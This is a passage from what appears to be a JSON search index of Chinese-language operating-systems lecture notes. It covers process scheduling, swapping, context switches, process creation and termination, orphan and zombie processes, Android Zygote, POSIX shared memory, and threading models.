<li>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u8c03\u5ea6\u5668\uff08scheduler\uff09\u6765\u8fdb\u884c\u8fdb\u7a0b\u7684\u8c03\u5ea6\uff0c\u9009\u62e9\u6267\u884c\u54ea\u4e2a\u8fdb\u7a0b<ul> <li>\u6b64\u5904\u6682\u65f6\u8ba4\u4e3a\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u5305\u542b\u4e00\u4e2a\u7ebf\u7a0b</li> <li>\u5b9e\u9645\u4e0a\u4e00\u4e2a\u7ebf\u7a0b\u624d\u662f\u88ab\u8c03\u5ea6\u7684\u5b9e\u4f53\u3001\u6700\u5c0f\u5355\u4f4d</li> </ul> </li> <li>\u8c03\u5ea6\u53d1\u751f\u975e\u5e38\u9891\u7e41\uff0c\u800c\u4e14\u4e00\u5b9a\u8981\u5feb\uff08\u4e3a\u4e86\u63d0\u9ad8\u7cfb\u7edf\u7684\u53ef\u54cd\u5e94\u6027\uff09<ul> <li>\u88ab\u8c03\u5ea6\u7684\u8fdb\u7a0b\u4e0d\u4f1a\u610f\u8bc6\u5230\u8c03\u5ea6\u7684\u53d1\u751f</li> </ul> </li> <li>\u63d0\u9ad8 CPU \u5229\u7528\u7387<ul> <li>\u5982\u679c\u4e0d\u8c03\u5ea6\u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8fdb\u7a0b\u4e00\u76f4\u5728\u7b49\u5f85 I/O\uff08CPU \u95f2\u7f6e\uff09</li> <li>\u6b64\u65f6\u53ef\u4ee5\u8c03\u5ea6\u5230\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884c\u8fd0\u884c\uff0c\u63d0\u9ad8 CPU \u5229\u7528\u7387</li> </ul> </li> <li>\u5185\u6838\u4f1a\u7ef4\u62a4\u51e0\u4e2a\u961f\u5217\u8fdb\u884c\u8c03\u5ea6\uff1a<ul> <li>\u4efb\u52a1\u961f\u5217\uff08job queue\uff09\uff1a\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b</li> <li>\u5c31\u7eea\u961f\u5217\uff08ready queue\uff09\uff1a\u5c31\u7eea\u72b6\u6001\u7b49\u5f85\u6267\u884c\u7684\u8fdb\u7a0b</li> <li>\u8bbe\u5907\u961f\u5217\uff08device queue\uff09\uff1a\u7b49\u5f85 I/O \u8bbe\u5907\u7684\u8fdb\u7a0b</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#swap-in-swap-out","title":"swap in &amp; swap out","text":"<p>\u7406\u8bba\u60c5\u51b5\uff1a</p> <ul> <li>\u6bd4\u5982\u5728\u8fdb\u884c\u8fdb\u7a0b\u8c03\u5ea6\uff08p0 \u5207\u6362\u5230 p1\uff09\u7684\u65f6\u5019\u7269\u7406\u5185\u5b58\u4e0d\u591f\u7528\u4e86</li> <li>\u5c06 p0 \u7528\u5230\u7684\u7269\u7406\u5185\u5b58\u5199\u5165\u78c1\u76d8\uff08swap \u5206\u533a\uff09<ul> <li>\u8fd9\u4e2a\u64cd\u4f5c\u5c31\u662f swap out</li> </ul> </li> <li>\u7136\u540e\u5207\u6362\u5230 p1 \u8fdb\u884c\u6267\u884c\uff0c\u8fd9\u65f6\u5c31\u6709\u4e86\u5145\u8db3\u7684\u7269\u7406\u5185\u5b58</li> <li>\u518d\u8c03\u5ea6\u56de p0 \u65f6\uff0c\u9700\u8981\u5c06\u4e4b\u524d swap out \u7684\u7269\u7406\u5185\u5b58\u4ece\u78c1\u76d8\u8bfb\u56de\u6765<ul> <li>\u8fd9\u4e2a\u64cd\u4f5c\u5c31\u662f swap in</li> </ul> </li> </ul> <p>\u5982\u4eca\u5b9e\u9645\u7684\u5b9e\u73b0\uff1a</p> <ul> <li>\u65f6\u523b monitor \u5185\u5b58\u538b\u529b\u72b6\u51b5<ul> <li>\u5728\u7cfb\u7edf\u7a7a\u95f2\u7684\u65f6\u5019\u8fdb\u884c swap out</li> <li>\u800c\u4e0d\u662f\u5728\u5185\u5b58\u5df2\u7ecf\u8981\u4e0d\u591f\u7528\u7684\u65f6\u5019\u518d swap out</li> </ul> </li> <li>\u5c06\u6bd4\u8f83\u5c11\u7528\u7684\u7269\u7406\u5185\u5b58\u9875\uff08page\uff09swap out<ul> <li>\u7c92\u5ea6\u66f4\u7ec6\uff0c\u4e0d\u4f1a\u5c06\u6574\u4e2a\u8fdb\u7a0b\u7684\u7269\u7406\u5185\u5b58\u90fd swap out</li> </ul> </li> <li>\u5728\u8fdb\u7a0b\u6267\u884c\u7684\u65f6\u5019\u53d1\u73b0\u8981\u4f7f\u7528\u5230\u4e86 swap out \u51fa\u53bb\u7684\u5185\u5b58\u65f6\u624d\u4f1a swap in</li> </ul>"},{"location":"cs/system/cs2/topic4/#_7","title":"\u8fdb\u7a0b\u5206\u7c7b","text":"<p>\u8c03\u5ea6\u5668\u4f1a\u5c06\u8fdb\u7a0b\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>I/O-bound \u8fdb\u7a0b\uff1a\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u5728\u8fdb\u884c I/O \u8bf7\u6c42</li> <li>CPU-bound \u8fdb\u7a0b\uff1a\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u5728\u6267\u884c CPU \u6307\u4ee4\uff0c\u8fdb\u884c\u8ba1\u7b97</li> </ul>"},{"location":"cs/system/cs2/topic4/#_8","title":"\u4e0a\u4e0b\u6587\u5207\u6362","text":"<ul> <li>\u5728\u8fdb\u884c\u8c03\u5ea6\u7684\u65f6\u5019\uff0c\u5185\u6838\u9700\u8981\u5207\u6362\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u5207\u6362<ul> <li>\u5c06\u65e7\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4fdd\u5b58\u5230 PCB \u4e2d</li> <li>\u5c06\u65b0\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4ece PCB \u4e2d\u6062\u590d</li> </ul> </li> <li>\u4e0a\u4e0b\u6587\u5207\u6362\u662f\u6709\u5f00\u9500\u7684<ul> <li>\u5728\u505a\u7684\u4e8b\u60c5\u5728\u7528\u6237\u6001\u7a0b\u5e8f\u770b\u6765\u662f\u6ca1\u6709\u610f\u4e49\u7684</li> <li>\u9700\u8981\u5c3d\u53ef\u80fd\u7684\u7f29\u77ed\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u65f6\u95f4</li> <li>\u6709\u786c\u4ef6\u7684\u652f\u6301\u53ef\u4ee5\u52a0\u901f\u4e0a\u4e0b\u6587\u5207\u6362<ul> <li>\u6bd4\u5982\u6709\u7684\u786c\u4ef6\u4e2d\u53ef\u4ee5\u4fdd\u5b58\u591a\u5957\u5bc4\u5b58\u5668</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_9","title":"\u8fdb\u7a0b\u521b\u5efa","text":"<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7cfb\u7edf\u8c03\u7528\u6765\u8fdb\u884c\u8fdb\u7a0b\u7684\u521b\u5efa</li> <li>\u7cfb\u7edf\u4e2d\u6240\u6709\u8fdb\u7a0b\u4f1a\u5f62\u6210\u4e00\u4e2a\u8fdb\u7a0b\u6811</li> <li>\u7cfb\u7edf\u5728\u52a0\u8f7d\u540e\u4f1a\u4e3b\u52a8\u751f\u6210\u4e00\u4e2a pid \u4e3a 1 \u7684\u4e3b\u8fdb\u7a0b<ul> <li>\u7531 pid 0 \u7684 idle \u8fdb\u7a0b fork \u51fa\u6765</li> <li>\u540e\u9762\u6240\u6709\u7684\u8fdb\u7a0b\u90fd\u662f\u5b83\u7684\u5b50\u8fdb\u7a0b</li> </ul> </li> <li>\u4e09\u79cd\u8d44\u6e90\u5171\u4eab\u5f62\u5f0f\uff1a\u65e0\u5171\u4eab\uff08none\uff09\u3001\u9009\u62e9\u6027\u5171\u4eab\uff08subset\uff09\u3001\u5b8c\u5168\u5171\u4eab\uff08all\uff09</li> <li>\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4<ul> <li>Linux\uff1a\u5b50\u8fdb\u7a0b\u590d\u5236\u4e00\u4efd\u7236\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4</li> <li>Windows\uff1a\u5b50\u8fdb\u7a0b\u6709\u65b0\u52a0\u8f7d\u7684\u7a0b\u5e8f</li> </ul> </li> <li>\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u7684\u6267\u884c<ul> <li>\u521b\u5efa\u4e4b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u4f1a\u540c\u65f6\u6267\u884c\uff08\u4f5c\u4e3a\u72ec\u7acb\u88ab\u8c03\u5ea6\u7684\u5b9e\u4f53\uff09</li> <li>\u7236\u8fdb\u7a0b\u53ef\u4ee5\u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\u540e\u624d\u7ed3\u675f</li> </ul> </li> <li>UNIX/Linux \u521b\u5efa\u8fdb\u7a0b\u76f8\u5173\u7684\u7cfb\u7edf\u8c03\u7528<ul> <li>fork\uff1a\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b</li> <li>exec\uff1a\u6267\u884c\u4e00\u4e2a\u7a0b\u5e8f\uff08\u8986\u76d6\u539f\u6765\u7684\u5730\u5740\u7a7a\u95f4\uff09</li> <li>wait\uff1a\u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_10","title":"\u8fdb\u7a0b\u7ec8\u6b62","text":"<ul> <li>\u8fdb\u7a0b\u7ed3\u675f\uff08exit\uff09\u540e\u9700\u8981\u91ca\u653e\u6389\u8d44\u6e90\uff08\u4f8b\u5982 PCB\uff09</li> <li>\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 wait \u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\u5e76\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c</li> <li>\u7236\u8fdb\u7a0b\u4e5f\u53ef\u4ee5\u901a\u8fc7 abort \u6765\u7ec8\u6b62\u5b50\u8fdb\u7a0b</li> </ul>"},{"location":"cs/system/cs2/topic4/#_11","title":"\u5b64\u513f\u8fdb\u7a0b\u4e0e\u50f5\u5c38\u8fdb\u7a0b","text":"<ul> <li>Linux \u5141\u8bb8\u7236\u8fdb\u7a0b\u5148\u4e8e\u5b50\u8fdb\u7a0b\u7ed3\u675f<ul> <li>\u800c\u4e00\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u5141\u8bb8\u8fd9\u6837\uff0c\u7236\u8fdb\u7a0b\u7ed3\u675f\u540e\u4f1a\u5f3a\u5236\u6740\u6b7b\u6240\u6709\u5b50\u8fdb\u7a0b</li> <li>\u8fd9\u4e00\u8bbe\u8ba1\u4ea7\u751f\u4e86\u5b64\u513f\u8fdb\u7a0b</li> </ul> </li> <li>\u5b64\u513f\u8fdb\u7a0b\uff08Orphaned Process\uff09<ul> <li>\u7236\u8fdb\u7a0b\u6ca1\u6709\u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u800c\u5148\u4e8e\u5b50\u8fdb\u7a0b\u7ed3\u675f</li> <li>\u5b50\u8fdb\u7a0b\u4f1a\u88ab init \u8fdb\u7a0b\uff08pid 1\uff09\u63a5\u7ba1<ul> <li>\u4f8b\u5982 systemd \u4f1a\u901a\u8fc7 wait \u6765\u7b49\u5f85\u5b64\u513f\u8fdb\u7a0b\u7ed3\u675f</li> </ul> </li> </ul> </li> <li>\u50f5\u5c38\u8fdb\u7a0b\uff08Zombie Process\uff09<ul> <li>\u5b50\u8fdb\u7a0b\u7ed3\u675f\u4e86\uff0c\u4f46\u662f\u7236\u8fdb\u7a0b\u6ca1\u6709 wait</li> <li>\u8fd9\u65f6\u5b50\u8fdb\u7a0b\u7684\u76f8\u5173\u8d44\u6e90\u4e0d\u4f1a\u88ab\u91ca\u653e</li> <li>\u53ea\u6709\u624b\u52a8 kill \u6389\u7236\u8fdb\u7a0b\u624d\u4f1a\u91ca\u653e<ul> <li>\u5373\u8ba9\u50f5\u5c38\u8fdb\u7a0b\u53d8\u4e3a\u5b64\u513f\u8fdb\u7a0b\uff0c\u4ece\u800c\u88ab init \u8fdb\u7a0b\u63a5\u7ba1\u3001\u91ca\u653e</li> <li>kill \u6389\u50f5\u5c38\u8fdb\u7a0b\u65e0\u6548\uff0c\u56e0\u4e3a\u8fdb\u7a0b\u5df2\u7ecf\u6b7b\u4e86</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#android-zygote","title":"Android Zygote \u8fdb\u7a0b","text":"<ul> <li>\u76ee\u7684\u662f\u63d0\u9ad8\u54cd\u5e94\u6027\uff0c\u63d0\u9ad8\u5e94\u7528\u542f\u52a8\u901f\u5ea6</li> <li>\u7cfb\u7edf\u542f\u52a8\u540e pid 1 init \u8fdb\u7a0b\u4f1a fork \u51fa\u4e00\u4e2a Zygote \u8fdb\u7a0b</li> <li>Zygote \u4e2d\u4f1a\u52a0\u8f7d\u4e00\u4e9b\u7cfb\u7edf\u5e93\u3001\u8fd0\u884c\u65f6</li> <li>\u5728\u5176\u4ed6\u5e94\u7528\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u4ece Zygote \u8fdb\u7a0b fork \u51fa\u5b50\u8fdb\u7a0b<ul> <li>\u5b50\u8fdb\u7a0b\u4f1a\u590d\u5236 Zygote \u8fdb\u7a0b\u5b8c\u6574\u7684\u5730\u5740\u7a7a\u95f4</li> <li>\u4e0d\u9700\u8981\u8fdb\u884c\u989d\u5916\u7684\u52a0\u8f7d\u5e93\u64cd\u4f5c\uff0c\u63d0\u9ad8\u542f\u52a8\u901f\u5ea6</li> </ul> </li> <li>\u5b89\u5168\u95ee\u9898<ul> <li>Zygote fork \u51fa\u6765\u7684\u8fdb\u7a0b\u5185\u5b58\u5e03\u5c40\u76f8\u540c</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_12","title":"\u8fdb\u7a0b\u95f4\u901a\u4fe1","text":"<ul> <li>\u72ec\u7acb\u8fdb\u7a0b\uff08independent process\uff09\uff1a\u4e0d\u4f1a\u5f71\u54cd\u5176\u4ed6\u8fdb\u7a0b\u6267\u884c\uff0c\u4e5f\u4e0d\u4f1a\u88ab\u5176\u4ed6\u8fdb\u7a0b\u5f71\u54cd</li> <li>\u534f\u4f5c\u8fdb\u7a0b\uff08cooperating process\uff09\uff1a\u53ef\u4ee5/\u9700\u8981\u548c\u5176\u4ed6\u8fdb\u7a0b\u4e92\u76f8\u5f71\u54cd\uff08\u5305\u62ec\u6570\u636e\u5171\u4eab\uff09<ul> <li>\u8fd9\u6837\u7684\u8fdb\u7a0b\u9700\u8981\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08Inter-Process Communication\uff0cIPC\uff09</li> </ul> </li> <li>\u6709\u4e24\u79cd IPC \u7684\u6a21\u578b<ul> <li>\u5171\u4eab\u5185\u5b58\uff08Shared Memory\uff09</li> <li>\u6d88\u606f\u4f20\u9012\uff08Message Passing\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#posix","title":"POSIX \u5171\u4eab\u5185\u5b58","text":"<ul> <li>\u901a\u8fc7 <code>shm_open(name, O_CREAT | O_RDWR, 0666)</code> \u521b\u5efa\u5171\u4eab\u5185\u5b58<ul> <li>name \u662f\u5171\u4eab\u5185\u5b58\u7684\u540d\u5b57</li> <li>O_CREAT \u8868\u793a\u5982\u679c\u4e0d\u5b58\u5728\u5219\u521b\u5efa</li> <li>O_RDWR \u8868\u793a\u53ef\u8bfb\u53ef\u5199</li> <li>0666 \u8868\u793a\u6743\u9650</li> <li>\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08shm_fd\uff09</li> </ul> </li> <li>\u901a\u8fc7 <code>ftruncate(shm_fd, size)</code> \u8bbe\u7f6e\u5171\u4eab\u5185\u5b58\u7684\u5927\u5c0f</li> <li>\u901a\u8fc7 <code>mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0)</code> \u5c06\u5171\u4eab\u5185\u5b58\u6620\u5c04\u5230\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4<ul> <li>PROT_READ \u8868\u793a\u53ef\u8bfb\u3001PROT_WRITE \u8868\u793a\u53ef\u5199</li> <li>\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u5171\u4eab\u5185\u5b58\u7684\u6307\u9488\uff08shm_ptr\uff09</li> <li>\u4e4b\u540e\u4fbf\u53ef\u4ee5\u901a\u8fc7 shm_ptr \u6765\u8bfb\u5199\u5171\u4eab\u5185\u5b58</li> <li>\u901a\u8fc7 mmap \u8fdb\u884c\u64cd\u4f5c\u4e0e\u901a\u8fc7 read\u3001write \u8fdb\u884c\u8bfb\u5199\u7684\u597d\u5904\uff1a<ul> <li>mmap \u540e\u53ef\u4ee5\u76f4\u63a5\u64cd\u4f5c\u5185\u5b58</li> <li>read\u3001write \u8fd8\u4f1a\u7ecf\u8fc7\u7cfb\u7edf\u8c03\u7528</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_13","title":"\u7ebf\u7a0b","text":"<p>\u4e3a\u4ec0\u4e48\u9700\u8981\u7ebf\u7a0b\uff1a</p> <ul> <li>\u8fdb\u7a0b\u4e4b\u95f4\u8d44\u6e90\u662f\u9694\u79bb\u7684\uff0c\u8d44\u6e90\u5171\u4eab\u56f0\u96be\uff08\u90fd\u8981\u901a\u8fc7 IPC\uff09</li> <li>\u540c\u4e00\u8fdb\u7a0b\u91cc\u7684\u4e0d\u540c\u7ebf\u7a0b\u7684\u8d44\u6e90\u662f\u5171\u4eab\u7684\uff0c\u8d44\u6e90\u5171\u4eab\u9ad8\u6548\u4e14\u6613\u7528</li> <li>\u7ebf\u7a0b\u662f\u53ef\u4ee5\u88ab\u8c03\u5ea6\u7684\u5b9e\u4f53\u3001\u6700\u5c0f\u5355\u4f4d<ul> <li>\u56e0\u6b64\u7ebf\u7a0b\u53ef\u4ee5\u72ec\u7acb\u8fd0\u884c\uff0c\u53c8\u53ef\u4ee5\u5171\u4eab\u6570\u636e</li> </ul> </li> <li>\u7ebf\u7a0b\u7684\u521b\u5efa\u6bd4\u8fdb\u7a0b\u66f4\u8f7b\u91cf</li> <li>\u7ebf\u7a0b\u4f18\u70b9\uff1a<ul> <li>\u53ef\u54cd\u5e94\u6027\u66f4\u9ad8</li> <li>\u8d44\u6e90\u5171\u4eab\u66f4\u65b9\u4fbf\u66f4\u9ad8\u6548\uff08\u4e0d\u9700\u8981\u901a\u8fc7 IPC\u3001\u7cfb\u7edf\u8c03\u7528\uff09</li> <li>\u66f4\u7ecf\u6d4e\uff08\u7ebf\u7a0b\u66f4\u8f7b\u91cf\uff09</li> <li>\u5e76\u884c\u6027\u66f4\u5f3a\uff08\u591a\u6838 CPU \u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u7ebf\u7a0b\uff09</li> </ul> </li> </ul> <p>\u4ec0\u4e48\u662f\u7ebf\u7a0b\uff1a</p> <ul> <li>\u72ec\u7acb\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u53ef\u4ee5\u88ab\u5185\u6838\u5355\u72ec\u8c03\u5ea6</li> <li>\u5171\u4eab\u4e0e\u4e0d\u5171\u4eab\u7684\u8d44\u6e90\uff1a<ul> <li>\u5171\u4eab\u8fdb\u7a0b\u7684 code\u3001data\u3001heap\u3001files</li> <li>\u6bcf\u4e2a\u7ebf\u7a0b\u6709\u81ea\u5df1\u72ec\u7acb\u7684 stack\u3001registers\u3001pc\u3001thread-specific data<ul> <li>\u4fdd\u7559\u6bcf\u4e2a\u7ebf\u7a0b\u72ec\u7acb\u7684\u6267\u884c\u7684\u73af\u5883\u6765\u652f\u6301\u8fdb\u884c\u8c03\u5ea6</li> <li>\u6808\u4e0d\u5171\u4eab\uff0c\u4f46\u662f\u4e0d\u9694\u79bb\uff08\u5373\u53ef\u4ee5\u901a\u8fc7\u5730\u5740\u89e3\u5f15\u7528\u6765\u83b7\u53d6\u5176\u4ed6\u7ebf\u7a0b\u6808\u4e0a\u7684\u503c\uff09</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_14","title":"\u5e76\u53d1\u4e0e\u5e76\u884c","text":"<ul> <li>\u5e76\u53d1\uff08Concurrency\uff09\uff1a<ul> <li>\u5f3a\u8c03\u5c06\u4e00\u4e2a\u7a0b\u5e8f\u7ec4\u7ec7\u6210\u903b\u8f91\u4e0a\u591a\u4e2a\u4e0d\u540c\u6267\u884c\u7684\u5355\u5143</li> <li>\u4f7f\u5e76\u884c\u6267\u884c\u53d8\u5f97\u53ef\u80fd</li> <li>\u66f4\u5f3a\u8c03\u7a0b\u5e8f\u7684\u7ec4\u7ec7\u7ed3\u6784</li> </ul> </li> <li>\u5e76\u884c\uff08Parallelism\uff09\uff1a<ul> <li>\u591a\u4e2a\u6267\u884c\u5355\u5143\u53ef\u4ee5\u5728\u540c\u4e00\u65f6\u523b\uff08\u7269\u7406\uff09\u540c\u65f6\u6267\u884c</li> <li>\u66f4\u5f3a\u8c03\u7a0b\u5e8f\u7684\u6267\u884c\u65b9\u5f0f</li> </ul> </li> <li>\u8bbe\u8ba1\u4ee3\u7801\u7684\u65f6\u5019\u8981\u8003\u8651\u7684\u662f\u63d0\u9ad8\u5e76\u53d1\u6027<ul> <li>\u5e76\u53d1\u63d0\u4f9b\u4e86\u4f7f\u7a0b\u5e8f\u53ef\u80fd\u5e76\u884c\u6267\u884c\u7684\u7ed3\u6784</li> <li>\u5e76\u884c\u662f\u6267\u884c\u65f6\u505a\u7684\uff0c\u53ea\u6709\u591a\u6838\u624d\u53ef\u80fd\u5e76\u884c\u6267\u884c</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_15","title":"\u7ebf\u7a0b\u7684\u5b9e\u73b0","text":"<ul> <li>\u7528\u6237\u6001\u7ebf\u7a0b\uff08User-Level Threads\uff09<ul> <li>\u901a\u8fc7\u7ebf\u7a0b\u5e93\uff1aPOSIX Pthreads\u3001Win32 threads\u3001Java threads\u3001\u2026\u2026</li> </ul> </li> <li>\u5185\u6838\u6001\u7ebf\u7a0b\uff08Kernel-Level Threads\uff09<ul> <li>\u5185\u6838\u6001\u7ebf\u7a0b\u624d\u662f\u88ab\u8c03\u5ea6\u7684\u5b9e\u4f53</li> <li>\u5982\u679c\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u4e86\u5185\u6838\u6001\u7ebf\u7a0b\uff0c\u624d\u652f\u6301\u7528\u6237\u6001\u7ebf\u7a0b\u5355\u72ec\u8c03\u5ea6<ul> <li>\u7cfb\u7edf\u624d\u53ef\u4ee5\u611f\u77e5\u7528\u6237\u6001\u7ebf\u7a0b</li> <li>\u7cfb\u7edf\u4f1a\u4e3a\u6bcf\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5185\u6838\u7ebf\u7a0b\u4e0a</li> <li>\u7cfb\u7edf\u4f1a\u4ee5\u5185\u6838\u6001\u7ebf\u7a0b\u4e3a\u7c92\u5ea6\u8fdb\u884c\u8c03\u5ea6\uff0c\u5b9e\u73b0\u7528\u6237\u6001\u7ebf\u7a0b\u7684\u5355\u72ec\u8c03\u5ea6</li> </ul> </li> <li>\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u6001\u7ebf\u7a0b\u5e93\u7684\u4f7f\u7528\uff0c\u4f46\u53ea\u6709\u5b9e\u73b0\u4e86\u5185\u6838\u6001\u7ebf\u7a0b\u7684\u6982\u5ff5\uff0c\u624d\u53ef\u4ee5\u5b9e\u73b0\u7ebf\u7a0b\u7684\u5355\u72ec\u8c03\u5ea6</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u91cc\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b\u8868\uff08thread table\uff09\u6765\u8ddf\u8e2a\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u7ebf\u7a0b\uff08\u800c\u4e0d\u662f\u901a\u8fc7\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u7ebf\u7a0b\u8868\uff09</li> </ul> </li> </ul> <p>\u5982\u679c\u6ca1\u6709\u5185\u6838\u6001\u7ebf\u7a0b\uff0c\u4e5f\u5c31\u662f\u8bf4\u64cd\u4f5c\u7cfb\u7edf\u6ca1\u6709\u5b9e\u73b0\u7ebf\u7a0b\u7684\u6982\u5ff5\uff0c\u90a3\u4e48\u7528\u6237\u6001\u7ebf\u7a0b\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u7ebf\u7a0b\u5e93\u6b63\u5e38\u521b\u5efa\uff0c\u4e0d\u8fc7\u53ea\u80fd\u5e76\u53d1\u800c\u4e0d\u80fd\u5e76\u884c\u6267\u884c\uff08\u56e0\u4e3a\u6b64\u65f6\u7cfb\u7edf\u7684\u8c03\u5ea6\u7c92\u5ea6\u662f\u8fdb\u7a0b\u4e3a\u5355\u4f4d\uff0c\u4e0d\u4f1a\u5355\u72ec\u8c03\u5ea6\u8fdb\u7a0b\u4e2d\u7684\u5404\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\uff09\u3002</p> <p>\u5982\u4eca\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e00\u5b9a\u90fd\u662f\u652f\u6301\u5185\u6838\u6001\u7ebf\u7a0b\u7684\u3002</p>"},{"location":"cs/system/cs2/topic4/#_16","title":"\u7528\u6237\u7ebf\u7a0b\u4e0e\u5185\u6838\u7ebf\u7a0b\u5173\u7cfb","text":"<ul> <li>\u591a\u5bf9\u4e00\uff08many-to-one\uff09<ul> <li>\u591a\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u7ed1\u5b9a\u5230\u540c\u4e00\u4e2a\u5185\u6838\u6001\u7ebf\u7a0b\u4e0a</li> <li>\u5f53\u7cfb\u7edf\u8c03\u5ea6\u5230\u8fd9\u4e2a\u5185\u6838\u7ebf\u7a0b\u65f6\uff0c\u8fd4\u56de\u5230\u5bf9\u5e94\u7684\u7528\u6237\u6001\u7ebf\u7a0b\u8c03\u5ea6\u5668\u4e0a\u9009\u62e9\u8fd0\u884c\u54ea\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b</li> <li>\u5f53\u4e00\u7ec4\u5185\u7684\u4e00\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u5019\uff0c\u5176\u5b83\u7528\u6237\u6001\u7ebf\u7a0b\u4e5f\u4e0d\u4f1a\u5f97\u5230\u8fd0\u884c\u673a\u4f1a<ul> <li>\u56e0\u4e3a\u7cfb\u7edf\u4ece\u5f53\u524d\u5185\u6838\u6001\u7ebf\u7a0b\u8c03\u5ea6\u8d70\u4e86</li> <li>\u7cfb\u7edf\u4e0d\u4f1a\u610f\u8bc6\u5230\u5185\u6838\u6001\u7ebf\u7a0b\u4e2d\u6709\u591a\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u7b49\u5f85\u6267\u884c\u3001\u8c03\u5ea6</li> </ul> </li> <li>\u5728\u5982\u4eca\u7684\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u4e0d\u5b58\u5728</li> </ul> </li> <li>\u4e00\u5bf9\u4e00\uff08one-to-one\uff09<ul> <li>\u4e00\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5185\u6838\u6001\u7ebf\u7a0b\u4e0a</li> <li>\u6bcf\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94\u7684\u5185\u6838\u6001\u7ebf\u7a0b</li> <li>\u4e00\u4e2a\u7ebf\u7a0b\u88ab block \u7684\u65f6\u5019\uff0c\u5176\u5b83\u7ebf\u7a0b\u4ecd\u7136\u53ef\u4ee5\u8fd0\u884c</li> <li>\u591a\u7ebf\u7a0b\u53ef\u4ee5\u5e76\u884c\u8fd0\u884c\u5728\u591a\u5904\u7406\u5668\u4e0a</li> <li>\u603b\u7ebf\u7a0b\u6570\u91cf\u53ef\u80fd\u4f1a\u53d7\u9650</li> <li>Linux\u3001Windows NT/XP/2000</li> </ul> </li> <li>\u591a\u5bf9\u591a\uff08many-to-many\uff09<ul> <li>\u591a\u4e2a\u7528\u6237\u6001\u7ebf\u7a0b\u7ed1\u5b9a\u5230\u591a\u4e2a\u5185\u6838\u6001\u7ebf\u7a0b</li> <li>\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u591a\u7684\u7528\u6237\u6001\u7ebf\u7a0b</li> <li>Windows NT/2000 with ThreadFiber package</li> </ul> </li> <li>two level \u6a21\u578b<ul> <li>\u540c\u65f6\u652f\u6301 many-to-many \u548c one-to-one</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_17","title":"\u7ebf\u7a0b\u76f8\u5173\u7684\u95ee\u9898","text":""},{"location":"cs/system/cs2/topic4/#fork-exec","title":"fork \u548c exec \u7cfb\u7edf\u8c03\u7528\u7684\u8bed\u4e49","text":"<ul> <li>\u6bcf\u4e00\u4e2a 